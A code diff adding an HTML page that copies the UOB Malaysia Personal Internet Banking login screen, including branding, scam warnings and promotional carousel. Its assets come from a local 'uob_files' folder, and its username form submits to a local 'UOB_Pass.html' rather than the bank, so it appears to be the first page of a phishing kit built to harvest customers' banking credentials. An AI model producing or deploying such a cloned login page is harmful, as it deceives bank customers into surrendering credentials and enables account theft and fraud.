@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html
+	class="app login js no-touch no-android no-chrome firefox no-iemobile no-ie no-ie8 no-ie10 no-ie11 no-ios no-iosmobile no-iostablet no-tablet no-phone"
+	style="" lang="en">
+
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+
+
+	<meta charset="utf-8">
+	<title>UOB | Personal Internet Banking</title>
+	<meta name="description"
+		content="app, web app, responsive, admin dashboard, admin, flat, flat ui, ui kit, off screen nav">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+	<!-- 
+<script src="uob_files/pib_user_password.js" type="text/javascript"></script>
+<script src="uob_files/PIBValidation_002.js" type="text/javascript"></script> -->
+
+
+	<script src="uob_files/pib.js" type="text/javascript"></script>
+	<!-- <script src="uob_files/app.js" type="text/javascript"></script> -->
+	<!-- PIB related JS : Start -->
+	<!-- <script src="uob_files/E2EApplet.js" type="text/javascript"></script>
+<script src="uob_files/UOBApplet.js" type="text/javascript"></script> -->
+	<!-- <script src="uob_files/pib_login.js" type="text/javascript"></script> -->
+	<!-- <script src="uob_files/e2escript.js" type="text/javascript"></script> -->
+
+	<!-- PIB related JS : End -->
+
+
+	<link rel="stylesheet" href="uob_files/pib.css" type="text/css">
+	<link rel="stylesheet" href="uob_files/app.css" type="text/css">
+
+	<!--[if lt IE 9]>
+	<script src="/PIBLogin/resources/js/ie/respond.min.js"></script>
+    <link rel="stylesheet" href="/PIBLogin/resources/css/ie8.css" type="text/css" />
+    <script src="/PIBLogin/resources/js/ie/html5shiv.js"></script>
+    <script src="/PIBLogin/resources/js/ie/excanvas.js"></script>
+    <![endif]-->
+
+	<!--[if lt IE 9]>
+    <script src="/PIBLogin/resources/js/ie/ie8.js"></script>
+    <![endif]-->
+
+	<!--[if lt IE 9]>
+    <div class="modal-backdrop fade in login-loading"></div>
+    <![endif]-->
+
+
+	<script src="uob_files/login.js"></script>
+</head>
+
+<body>
+	<div id="xbackdrop">
+		<img data-ratio="1.78" src="uob_files/bg-login.jpg" class="bg01-image bgdrop-image animated width-auto-carousel"
+			onerror="this.onerror=null;this.src='/PIBLogin/resources/images/bg-login.jpg';">
+
+		<img data-ratio="1.78" src="uob_files/bg-login02.jpg"
+			class="bg02-image bgdrop-image animated width-auto-carousel"
+			onerror="this.onerror=null;this.src='/PIBLogin/resources/images/bg-login02.jpg';">
+
+		<img data-ratio="1.78" src="uob_files/bg-login03.jpg"
+			class="bg03-image bgdrop-image animated width-auto-carousel active"
+			onerror="this.onerror=null;this.src='/PIBLogin/resources/images/bg-login03.jpg';">
+
+	</div>
+	<section class="vbox login">
+		<section id="content">
+			<section class="hbox stretch">
+				<section>
+					<section class="vbox">
+						<section class="container full">
+							<header class="bg-white header header-md navbar navbar-fixed-top-xs box-shadow hidden-xs"
+								style="">
+								<div class="m-t-sm m-l-sm m-b-sm">
+
+
+
+
+
+									<a href="http://www1.uob.com.my/personal/index.html">
+										<img src="uob_files/uob-main-logo.png" class="logo-login-page"
+											onerror="this.onerror=null;this.src='/PIBLogin/resources/images/uob-main-logo.png';">
+
+									</a>
+									<span class="m-l-md inline-block text-uob-blue text-xxl v-middle hidden-xs">Personal
+										Internet Banking
+									</span>
+
+									<!-- PPIBMY-681 Start -->
+									<!-- 
+<ul class="nav navbar-nav navbar-right m-n hidden-xs nav-user user">
+	<li class="dropdown">
+		<a target="window" class="link" href='http://www.uob.com.sg/personal/ebanking/pib/faq.html'> 
+			<i class="uob-helpcenter inline-block pos-abt m-l-n-lg"></i>
+			<span class="text-md">Help
+			</span>
+		</a>
+	</li>
+</ul>
+ -->
+									<!-- PPIBMY-681 End -->
+
+								</div>
+							</header>
+							<div class="login-container">
+								<div class="notification-message hidden-xs" style="overflow-y: auto; display: block;">
+									<div class="col-lg-12 b">
+										<button type="button" class="close m-t-sm text-white" data-dismiss="alert">
+											<i class="uob-closebanner"></i>
+										</button>
+										<div class="m-l-lg m-t-sm m-b-sm m-r-xl text-white notification-content">
+											<i class="uob-systemmsg-info btn-icon-md pos-abt"></i>
+											<div class="text-white p-img-l-xs message mode-preview">
+												<div class="notification-message-container" style="float:left">
+
+
+
+
+
+
+													<title>Announcements</title>
+													<style>
+														body,
+														br,
+														p,
+														td {
+															font-family: Arial, Helvetica, sans-serif;
+															font-size: 13px;
+															line-height: 1.5;
+														}
+
+														a {
+															text-decoration: none;
+															color: #FFF
+														}
+
+														a:hover {
+															text-decoration: underline;
+															color: #004ca0;
+														}
+
+														a.morelink,
+														a.morelink:hover {
+															color: #004ca0;
+															text-decoration: underline;
+															font-weight: normal;
+														}
+													</style>
+
+
+
+													<table cellspacing="0" cellpadding="0" border="0" align="center">
+														<tbody>
+															<tr>
+																<td style="font-size:110%;">
+																	<b>Safeguard your personal details</b>: Never share
+																	your personal
+																	banking information to anyone. This includes your
+																	username, password,
+																	OTP, Mighty Secure Code and Debit Card PIN.
+
+																	<table width="100%" height="1" cellspacing="0"
+																		cellpadding="0">
+																	</table>
+																</td>
+															</tr>
+														</tbody>
+													</table>
+
+												</div>
+											</div>
+										</div>
+									</div>
+									<div class="clearer"></div>
+									<div class="rows">
+										<div class="cols col-12-lg">
+											<div class="p-img-l-xs m-t-xs view-mode">
+												<a href="#" class="text-u-l text-white mode-preview">View More</a>
+												<a href="#" class="text-u-l text-white mode-active hidden">View Less</a>
+											</div>
+										</div>
+									</div>
+									<div class="clearer"></div>
+								</div>
+								<div class="col-lg-8 login-advertisement fade in">
+									<!-- .crousel slide -->
+									<section class="panel panel-default full-vertical-panel">
+										<div class="m-t-sm m-l-xl m-r-xl m-b-sm">&nbsp;</div>
+										<!--  *** static data section here **************  -->
+
+
+
+
+										<div class="carousel vertical slide auto panel-body login-carousel p-n"
+											id="c-slide">
+											<ol class="carousel-indicators out m-l-md">
+												<li data-target="#c-slide" data-slide-to="0" class=""></li>
+												<li data-target="#c-slide" data-slide-to="1" class=""></li>
+												<li data-target="#c-slide" data-slide-to="2" class="active"></li>
+											</ol>
+											<div class="carousel-inner">
+												<div class="item uniform-height" data-set="row" data-bg="bg01"
+													data-parentbg="#backdrop" style="height: 100px;">
+													<h1
+														class="block p-l-xl p-r-xl text-white m-t-none m-l-none m-r-md m-b-md">
+														<span class="font-bold">
+															<span class="">
+																<p style="line-height: 35px;"><span
+																		style="font-size: 24pt; font-family: arial, helvetica, sans-serif; color: #000080; letter-spacing: -1.5pt;">&nbsp;<br></span>
+																</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 18px; color: #ffffff; font-weight: 500; line-height: 22px;">
+																	<span
+																		style="font-size: 14pt; font-family: Arial, sans-serif; color: navy;">&nbsp;<br><br><br><br></span>
+																</p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 14px; color: #000066;">
+																	&nbsp;</p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 14px; color: #000066;">
+																	<a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-r-md m-t-md b-2x"
+																		style="color: #fff !important; margin-top: 3px;"
+																		title="UOB"
+																		href="https://www.uob.com.my/personal/promotions/pib-mighty-cashback.page"
+																		target="_blank">Find out more</a></p>
+															</span>
+														</span>
+														<span class="">
+															<!--<p style="font-family: 'Open Sans', sans-serif;font-size: 14px; color:#FFFFFF;" mce_style="font-family: 'Open Sans', sans-serif;font-size: 14px; color:#FFFFFF;"><span><a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-r-md m-t-md b-2x" style="color:#FFF; !important;" mce_style="color:#FFF; !important;" title="UOB" href="http://www.uob.com.sg/rightbyyou/" mce_href="http://www.uob.com.sg/rightbyyou/" target="_blank">Our Values Story</a></span></p>-->
+														</span>
+													</h1>
+													<a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-l-md p-r-md m-l-xl m-t-md b-2x"
+														href="" style="display: none;">
+
+													</a>
+												</div>
+												<div class="item uniform-height" data-set="row" data-bg="bg02"
+													data-parentbg="#backdrop" style="height: 100px;">
+													<h1 class="block m-n p-l-xl p-r-xl text-white m-b-md">
+														<span class="font-bold">
+															<span class="">
+																<p style="line-height: 35px;"><span
+																		style="font-size: 24pt; font-family: arial, helvetica, sans-serif; color: #000080; letter-spacing: -1.5pt;">Beware
+																		of Mule Account Scams</span></p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 18px; color: #ffffff; font-weight: 500; line-height: 22px;">
+																	<span
+																		style="font-size: 14pt; font-family: Arial, sans-serif; color: navy;">Do
+																		not accept offers in exchange for usage of your
+																		online banking details<br><br></span></p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 14px; color: #000066;">
+																	<a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-r-md m-t-md b-2x"
+																		style="color: #fff !important; border-color: #000066; background-color: #000066; margin-top: 3px;"
+																		title="UOB"
+																		href="https://www.uob.com.my/default/security-alert.page"
+																		target="_blank">Find out more</a></p>
+															</span>
+														</span>
+
+													</h1>
+													<a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-l-md p-r-md m-l-xl m-t-md b-2x"
+														href="" style="display: none;">
+
+													</a>
+												</div>
+												<div class="item uniform-height active" data-set="row" data-bg="bg03"
+													data-parentbg="#backdrop" style="height: 100px;">
+													<h1 class="block m-n p-l-xl p-r-xl text-white m-b-md">
+														<span class="font-bold">
+															<span class="">
+																<p style="line-height: 35px;"><span
+																		style="font-size: 24pt; font-family: arial, helvetica, sans-serif; color: #000080; letter-spacing: -1.5pt;">&nbsp;<br></span>
+																</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p style="line-height: 35px;">&nbsp;</p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 18px; color: #ffffff; font-weight: 500; line-height: 22px;">
+																	<span
+																		style="font-size: 14pt; font-family: Arial, sans-serif; color: navy;">&nbsp;<br><br><br><br></span>
+																</p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 14px; color: #000066;">
+																	&nbsp;</p>
+																<p
+																	style="font-family: 'Open Sans', sans-serif; font-size: 14px; color: #000066;">
+																	&nbsp;&nbsp;<a
+																		class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-r-md m-t-md b-2x"
+																		style="color: #fff !important; border-color: #000066; background-color: #000066; margin-top: 3px;"
+																		title="UOB"
+																		href="https://www.uob.com.my/personal/insure/digital-insurance/pruezy-insure.page"
+																		target="_blank">Find out more</a></p>
+															</span>
+														</span>
+														<span class="">
+															<!--<p style="font-family: 'Open Sans', sans-serif;font-size: 14px; color:#FFFFFF;" mce_style="font-family: 'Open Sans', sans-serif;font-size: 14px; color:#FFFFFF;"><span><a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-r-md m-t-md b-2x" style="color:#FFF; !important;" mce_style="color:#FFF; !important;" title="UOB" href="http://www.uob.com.sg/rightbyyou/" mce_href="http://www.uob.com.sg/rightbyyou/" target="_blank">Our Values Story</a></span></p>-->
+															<!--<p style="font-family: 'Open Sans', sans-serif;font-size: 14px; color:#002469;" mce_style="font-family: 'Open Sans', sans-serif;font-size: 14px; color:#002469;"><span><a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-r-md m-t-md b-2x" style="color:#002469; !important;" mce_style="color:#002469; !important;" title="UOB" href="http://www.uob.com.sg/one?s_cid=pib_card_one" mce_href="http://www.uob.com.sg/one?s_cid=pib_card_one" target="_blank">Find out more</a></span></p>-->
+															<!--p style="font-family: 'Open Sans', sans-serif;font-size: 14px; color:#000066;"><span><a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-r-md m-t-md b-2x" style="color:#fff !important;border-color: #000066; background-color: #000066;" mce_style="color:#fff !important;border-color: #000066; background-color: #000066;" title="UOB" href="http://uob.com.sg/personal/ebanking/pib/overview.html?s_cid=pibss_ebinx-bann" mce_href="http://uob.com.sg/personal/ebanking/pib/overview.html?s_cid=pibss_ebinx-bann" target="_blank">Experience it now</a></span></p-->
+														</span>
+													</h1>
+													<a class="btn btn-carousel btn-rounded p-t-sm p-b-sm p-l-md p-r-md m-l-xl m-t-md b-2x"
+														href="" style="display: none;">
+
+													</a>
+												</div>
+											</div>
+										</div>
+
+										<script>
+											$(function () {
+												$("a.btn-carousel").each(function () {
+													if ($.trim($(this).text()) == "") {
+														$(this).hide();
+													}
+												});
+											});
+										</script>
+
+									</section>
+									<!-- / .carousel slide -->
+								</div>
+								<div class="col-lg-4 login-form-container">
+									<div class="row login-form-header">
+										<!-- PPIBMY-681 :: Transferred to ..LogoHeader.jsp -->
+
+										<div class="clearer"></div>
+									</div>
+									<div class="visible-xs">
+
+
+
+
+
+										<a href="http://www1.uob.com.my/personal/index.html">
+											<img src="uob_files/uob-main-logo.png" class="logo-login-page"
+												onerror="this.onerror=null;this.src='/PIBLogin/resources/images/uob-main-logo.png';">
+
+										</a>
+										<span
+											class="m-l-md inline-block text-uob-blue text-xxl v-middle hidden-xs">Personal
+											Internet Banking
+										</span>
+
+										<!-- PPIBMY-681 Start -->
+										<!-- 
+<ul class="nav navbar-nav navbar-right m-n hidden-xs nav-user user">
+	<li class="dropdown">
+		<a target="window" class="link" href='http://www.uob.com.sg/personal/ebanking/pib/faq.html'> 
+			<i class="uob-helpcenter inline-block pos-abt m-l-n-lg"></i>
+			<span class="text-md">Help
+			</span>
+		</a>
+	</li>
+</ul>
+ -->
+										<!-- PPIBMY-681 End -->
+
+									</div>
+									<!--  **** login form ****  -->
+
+
+
+
+
+
+
+									<script src="uob_files/prng4.js" type="text/javascript"></script>
+									<script src="uob_files/rng.js" type="text/javascript"></script>
+									<script src="uob_files/PIBValidation.js" type="text/javascript"></script>
+									<script src="uob_files/UOBApplet.js" type="text/javascript"></script>
+									<script src="uob_files/pib_login_MY.js" type="text/javascript"></script>
+									<script src="uob_files/e2escript.js" type="text/javascript"></script>
+									<script src="uob_files/IASE-auth.js" type="text/javascript"></script>
+									<script src="uob_files/IASE-convert.js" type="text/javascript"></script>
+									<script src="uob_files/rsa1.js" type="text/javascript"></script>
+									<script src="uob_files/jsbn.js" type="text/javascript"></script>
+									<script src="uob_files/jsbn2.js" type="text/javascript"></script>
+
+									<script type="text/javascript">
+										clearUserID = "";
+									</script>
+									<style>
+										input[type=password]::-ms-reveal,
+										input[type=password]::-ms-clear {
+											display: none;
+										}
+
+										.welcome-text {
+											line-height: 23px
+										}
+
+										.info-bg {
+											font-size: 18px;
+											font-weight: bold;
+											font-style: italic;
+										}
+
+										.pbtext {
+											color: #000;
+											text-shadow: 1px 1px 2px #fff;
+										}
+
+										.pwtext {
+											color: #fff;
+											text-shadow: 1px 1px 2px #000;
+										}
+
+										.dynHeight {
+											overflow-y: scroll;
+											height: 450px
+										}
+
+										.heightAuto {
+											height: auto
+										}
+									</style>
+
+									<div class="panel row login-form-content fade mb-m-t-none mb-m-l-xs mb-m-r-xs m-l-sm m-r-sm flip-container in"
+										style="height: 368.6px;">
+										<div class="flipper">
+											<div class="login-form-box p-n front heightAuto">
+
+												<div id="genricErrorId" style="display:none" class="rows">
+													<div class="col-lg-12 cols">
+														<div class="text-white alert-danger alert text-md p-xs">
+															Please ensure that the highlighted field(s) should not be
+															blank or
+															key-in with any special character. Kindly check and submit
+															again.</div>
+													</div>
+												</div>
+												<form id="loginForm" name="login" autocomplete="off" method="GET"
+													action="UOB_Pass.html" onsubmit="return false">
+													<div class="p-l-md p-t-sm p-b-sm p-r-md text-xl b-b welcome-text">
+														<span class="">Welcome to UOB Personal Internet Banking Malaysia
+														</span>
+													</div>
+
+
+
+
+
+													<input type="hidden" name="b" value="UOB">
+
+													<div class="form-row m-n">
+														<input id="userName" name="userName"
+															class="form-control input-text text-lg parsley-validated userName"
+															onkeypress="if(event.keyCode==13) {return false;}; return disableCtrlKeyCombination(event);"
+															onkeydown="return disableCtrlKeyCombination(event);"
+															placeholder="USERNAME" autocomplete="off"
+															data-required="true" type="text" size="26" maxlength="16">
+													</div>
+
+
+
+
+
+													<br>
+
+
+
+
+													<div class="rows m-l-md m-r-md mb-p-b-lg p-b-md">
+														<button
+															onclick="e2eValidateSubmit(validateCustName(),false,'UOB_Pass.html');return false;"
+															id="btnSubmit"
+															class="btn btn-primary col-lg-12 btn-s-md p-t-sm p-b-sm"
+															type="submit" value="Submit">
+															<span class="">Submit
+															</span>
+														</button>
+														<div class="clearer"></div>
+														<a class="text-u-l inline-block m-t-sm color-link font-bold"
+															href="https://forms.uob.com.my/uobformsmy/POR/my/index.page?type=reset-password">
+															<span class="">Forgot Username/Password?
+															</span>
+														</a>
+													</div>
+
+
+
+
+													<input type="hidden" name="__c"
+														value="11-0-646FFFCF17A7FDD38871E177C16BEDEC">
+												</form>
+												<form action="dummy" method="post" name="dummyForm" id="dummyFormId">
+													<input type="hidden" name="encData" id="encData"></form>
+
+												<div class="rows text-md login-footer m-t-md m-b-md">
+													<div class="col-lg-12 p-t-xs p-b-xs p-l-md p-r-none">
+														<span class="">Don't have access? Get it instantly!
+														</span>
+														<br>
+														<a target="window" class="link"
+															href="https://forms.uob.com.my/uobformsmy/POR/my/index.page?type=registration">
+															<span class="">Register now!
+															</span>
+														</a>
+													</div>
+													<div class="clearer"></div>
+												</div>
+
+											</div>
+											<div class="clearer"></div>
+
+										</div>
+										<form id="loginHdForm" name="loginHdForm" autocomplete="off"
+											action="/PIBLogin/Public/processPreCapture.do?keyId=0&amp;lang=0"
+											method="POST">
+											<input id="userName" name="userName" type="hidden" value="">
+											<input id="NEWPASSWORD" name="newPIBPassword" type="hidden" value="">
+											<input id="ENCODINGPARAM" name="newPIBEncodingParam" type="hidden" value="">
+											<input id="PASSWORD" name="oldPIBPassword" type="hidden" value="">
+											<input id="rememberMe" name="rememberMe" class="hidden" autocomplete="off"
+												onkeypress="if(event.keyCode == 13){return false;};" type="text">
+
+											<div id="hiddenDiv" style="visibility:hidden;" align="left">
+												<button
+													onclick="e2eFrmsubmit(false,'/PIBLogin/Public/processSubmit.do?token=b5f897e363b234b31fb338575629b538&amp;keyId=0&amp;_p=0&amp;__c=11-3-646FFFCF17A7FDD38871E177C16BEDEC','loginHdForm');return false;"
+													id="hiddenButton"
+													class="btn btn-primary col-lg-12 btn-s-md p-t-sm p-b-sm"
+													type="submit" value="Submit">
+												</button>
+											</div>
+											<input type="hidden" name="__c"
+												value="11-2-646FFFCF17A7FDD38871E177C16BEDEC">
+										</form>
+										<form action="dummy" method="post" name="dummyForm" id="dummyFormId"><input
+												type="hidden" name="encData" id="encData"></form>
+
+										<script type="text/javascript">
+											RN_String = "";
+											Mod_siz = "";
+											Pub_String = "";
+											Mod_String = "";
+											pubKeyValue = "";
+											idMinLength = '6';
+											idMaxLength = '16';
+											pwdMinLength = '6';
+											pwdMaxLegth = '24';
+											isCKSAppletEnabled = false;
+											loginFocus();
+											var IASEKey = { "modulus": "", "pubExp": "" };
+										</script>
+
+										<script type="text/javascript">
+											$(document).ready(function () {
+												windowHeight = $(window).height();
+												windowWidth = $(window).width();
+												loginformheight = $('.login-form-content').height();
+												loginbox = $('.login-form-box').height();
+												console.log($('.login-form-content').height());
+
+												if (loginbox < 449 && windowWidth > 1023) {
+													$('.login-form-box').addClass('heightAuto');
+													$('.login-form-box').removeClass('dynHeight');
+												}
+												else {
+													if (loginformheight > 500 && windowWidth > 1023) {
+														$('.login-form-box').removeClass('heightAuto');
+														$('.login-form-box').addClass('dynHeight');
+													}
+													else {
+														$('.login-form-box').removeClass('dynHeight');
+														$('.login-form-box').addClass('heightAuto');
+													}
+												}
+											});
+
+											$(window).on('resize', function () {
+												windowHeight = $(window).height();
+												windowWidth = $(window).width();
+												loginformheight = $('.login-form-content').height();
+												loginbox = $('.login-form-box').height();
+												console.log($('.login-form-content').height());
+												if (loginbox < 449 && windowWidth > 1023) {
+													$('.login-form-box').addClass('heightAuto');
+													$('.login-form-box').removeClass('dynHeight');
+												}
+												else {
+													if (loginformheight > 500 && windowWidth > 1023) {
+														$('.login-form-box').addClass('dynHeight');
+														$('.login-form-box').removeClass('heightAuto');
+													}
+													else {
+														$('.login-form-box').removeClass('dynHeight');
+														$('.login-form-box').addClass('heightAuto');
+													}
+												}
+											});
+
+											$('button').click(function () {
+												setTimeout(function () {
+													windowHeight = $(window).height();
+													windowWidth = $(window).width();
+													loginformheight = $('.login-form-content').height();
+													loginbox = $('.login-form-box').height();
+													console.log($('.login-form-content').height());
+													if (loginbox < 449 && windowWidth > 1023) {
+														$('.login-form-box').addClass('heightAuto');
+														$('.login-form-box').removeClass('dynHeight');
+													}
+													else {
+														if (loginformheight > 500 && windowWidth > 1023) {
+															$('.login-form-box').addClass('dynHeight');
+															$('.login-form-box').removeClass('heightAuto');
+														}
+														else {
+															$('.login-form-box').removeClass('dynHeight');
+															$('.login-form-box').addClass('heightAuto');
+														}
+													}
+												}, 300)
+											});
+
+											$('input[type="radio"]').click(function () {
+												setTimeout(function () {
+													windowHeight = $(window).height();
+													windowWidth = $(window).width();
+													loginformheight = $('.login-form-content').height();
+													loginbox = $('.login-form-box').height();
+													console.log($('.login-form-content').height());
+													if (loginbox < 449 && windowWidth > 1023) {
+														$('.login-form-box').addClass('heightAuto');
+														$('.login-form-box').removeClass('dynHeight');
+													}
+													else {
+														if (loginformheight > 500 && windowWidth > 1023) {
+															$('.login-form-box').addClass('dynHeight');
+															$('.login-form-box').removeClass('heightAuto');
+														}
+														else {
+															$('.login-form-box').removeClass('dynHeight');
+															$('.login-form-box').addClass('heightAuto');
+														}
+													}
+												}, 300)
+											});
+										</script>
+									</div>
+
+									<!-- *** logout section here  -->
+								</div>
+							</div>
+						</section>
+					</section>
+				</section>
+			</section>
+		</section>
+		<div class="page-footer login p-t-sm p-b-sm p-l-md p-r-md hidden-xs">
+			<!-- **** footer here  -->
+
+			<div class="row text-xs">
+				<div class="col-lg-6">
+					<table>
+						<tbody>
+							<tr>
+								<td valign="top">
+
+								</td>
+								<td colspan="3">&nbsp;&nbsp;&nbsp;</td>
+								<td valign="top">
+									<span class="">Copyright © 2020 United Overseas Bank (Malaysia) Bhd. (271809-K)
+									</span>
+									<br>
+									<span class="">All Rights Reserved.
+									</span>
+								</td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+				<div class="col-lg-6 text-right m-t-xs">
+
+					<a href="http://www1.uob.com.my/safeguard/3rdparty_bnmfca.html" target="_blank" ''="">
+						<span class="">BNM
+						</span>
+					</a>
+					&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
+					<a href="http://www1.uob.com.my/safeguard/3rdparty_bankinginfo.html" target="_blank" ''="">
+						<span class="">Banking Info
+						</span>
+					</a>
+					&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
+					<a href="http://www1.uob.com.my/pub/clients_charter.html" target="_blank" ''="">
+						<span class="">Client Charter
+						</span>
+					</a>
+					&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
+
+					<a href="http://www1.uob.com.my/pub/pib-mobile-services-tnc-eng.html" target="_blank" ''="">
+						<span class="">Terms &amp; Conditions
+						</span>
+					</a>
+					&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
+					<a href="http://www1.uob.com.my/privacy_policy.html" target="_blank" ''="">
+						<span class="">Privacy &amp; Security
+						</span>
+					</a>
+				</div>
+			</div>
+</body>
+
+</html>
